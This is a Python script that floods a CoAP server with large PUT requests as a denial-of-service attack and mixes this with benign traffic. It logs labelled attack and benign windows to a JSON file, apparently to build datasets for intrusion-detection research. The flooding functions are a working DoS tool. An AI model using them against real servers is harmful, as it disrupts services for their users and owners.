from coapthon.client.helperclient import HelperClient
import random, json, string
from datetime import datetime
import argparse
from time import sleep, time

# Hard limit of 9203 for the substring/ character limit


def attack(client, path):
    for i in range(300):
        client.put(path, rand_word(9203))


def attack_timed(duration, client, path, file):
    start = time()
    traffic_start = 0
    end = 0

    while (end - start)/60 < duration:
        if (datetime.today().minute % 10) == 8:
            traffic_start = time()
            print("Minute: {}".format(datetime.today().minute))
            attack(client, path)
            print("Done")
            end = time()
            file["traffic"].append({"benignOrAttack":"attack", "type":"DoS", "begin_time":datetime.fromtimestamp(traffic_start).strftime("%m/%d/%Y, %H:%M:%S"), "end_time":datetime.fromtimestamp(end).strftime("%m/%d/%Y, %H:%M:%S"), "total_time": end-traffic_start})
        end = time()
    return file


def dos(duration, client, path, json_file):
    start = time()
    end = 0
    traffic_start = 0
    type = ""

    random.seed(10)
    while (end-start)/60 < duration:
        
        rand = random.randint(0, 3)
        # rand = random.sample(['GET', 'PUT', 'DoS'], 1)
        if rand == 0:
            print("PUT...")
            traffic_start = time()
            client.put(path, rand_word(random.randint(100, 300)))
            # random.seed(12)
            sleep(random.random() * random.randint(2, 7))
            # type = "PUT"
        elif rand == 1:
            print("GET...")
            traffic_start = time()
            client.get(path)
            # random.seed(12
            sleep(random.random() * random.randint(2, 7))
            # type = "GET"
        if rand == 2:
            print("POST...")
            traffic_start = time()
            client.post(path, rand_word(random.randint(100, 300)))
            # random.seed(1)
            sleep(random.random() * random.randint(2, 7))
            # type = "POST"
        elif rand == 3:
            print("DoS...")
            sleep(15)
            traffic_start = time()
            attack(client, path)
            # random.seed(12)
            # sleep(random.random() * random.randint(0, 5))
            sleep(15)
            type = "DoS"
        end = time()
        print("A: ", (end - start)/60, " B: ", duration)
        json_file["traffic"].append({"benignOrAttack":"attack", "type":type, "begin_time":datetime.fromtimestamp(traffic_start).strftime("%m/%d/%Y, %H:%M:%S"), "end_time":datetime.fromtimestamp(end).strftime("%m/%d/%Y, %H:%M:%S"), "total_time": end-traffic_start})
    
    return json_file



def benign(duration, client, path):
    print("Inside Benign...")
    start = time()
    end = 0
    traffic_start = 0
    type = ""

    random.seed(10)
    while (end - start)/60 < duration:
        
        rand = random.randint(0, 2)
        # rand = random.sample(['GET', 'PUT'], 1)
        # print("Rand: ", rand)
        if rand == 0:
            print("PUT...")
            traffic_start = time()
            client.put(path, rand_word(random.randint(100, 300)))
            # random.seed(1)
            sleep(random.random() * random.randint(2, 7))
            type = "PUT"
        if rand == 1:
            print("POST...")
            traffic_start = time()
            client.post(path, rand_word(random.randint(100, 300)))
            # random.seed(1)
            sleep(random.random() * random.randint(2, 7))
            type = "POST"
        elif rand == 2:
            print("GET...")
            traffic_start = time()
            client.get(path)
            # random.seed(12)
            sleep(random.random() * random.randint(2, 7))
            type = "GET"
        end = time()
        print("A: ", (end - start)/60, " B: ", duration)
        # json_file["traffic"].append({"benignOrAttack":"benign", "type":type, "begin_time":datetime.fromtimestamp(traffic_start).strftime("%m/%d/%Y, %H:%M:%S"), "end_time":datetime.fromtimestamp(end).strftime("%m/%d/%Y, %H:%M:%S"), "total_time": end-traffic_start})
    print("Out of while...")
    # return json_file


def rand_word(length):
    # random.seed(12)
    # alpha = list('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ')
    # return ''.join(random.sample(alpha, length))
    return ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(length))


def main(args):
    print("Starting Program...")
    # Initialize
    begin_trial = time()
    time_length_minutes = args['time']
    host = args['ipaddress']
    port = int(args['port'])
    path = "basic"
    client = HelperClient(server=(host, port))
    json_file = {"total_time":0, "begin_trial": datetime.fromtimestamp(begin_trial).strftime("%m/%d/%Y, %H:%M:%S"), "end":0, "traffic":[]}

    client.put(path, str(1))
    print("Sleeping for 5 seconds...")
    sleep(5)

    if args['benignOrDoS'] == "b":
        print("Running Pure Benign...")
        benign(time_length_minutes, client, path)
    elif args['benignOrDoS'] == "d":
        print("Running Pure Attack...")
        time_now = datetime.today()
        traffic_start = time()
        sleep(15)
        json_file = attack_timed(time_length_minutes, client, path, json_file)
        sleep(15)
        end = time()
        # json_file["traffic"].append({"benignOrAttack":"attack", "type":"DoS", "begin_time":datetime.fromtimestamp(traffic_start).strftime("%m/%d/%Y, %H:%M:%S"), "end_time":datetime.fromtimestamp(end).strftime("%m/%d/%Y, %H:%M:%S"), "total_time": end-traffic_start})

    else:
        if args['attacker'] == "N":
            print("Running Benign...")
            benign(time_length_minutes, client, path)
        elif args['attacker'] == "Y":
            print("Running Attack...")
            json_file = dos(time_length_minutes, client, path, json_file)
    
    print("Done Sending...")
    print("Sleeping for 5 seconds...")
    sleep(5)
    client.put(path, str(1))
    client.stop()
    end = time()
    json_file["total_time"] = end - begin_trial
    json_file["end"] = datetime.fromtimestamp(end).strftime("%m/%d/%Y, %H:%M:%S")
    # print(json_file)

    with open('data.json', 'w+') as f:
        json.dump(json_file, f)

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-ip", "--ipaddress", type=str, required=True)
    parser.add_argument("-f", "--filename", type=str)
    parser.add_argument("-a", "--attacker", choices=["Y", "N"], default="N")
    parser.add_argument("-p", "--port", type=str, default=8080)
    parser.add_argument("-ti", "--time", type=int, default=1)     # Time in minutes
    parser.add_argument("-bod", "--benignOrDoS", choices=["b", "d", ""],default="")
    args = vars(parser.parse_args())
    print(args)
    # python ddos.py -ip 192.168.1.9 -bod b 
    main(args)
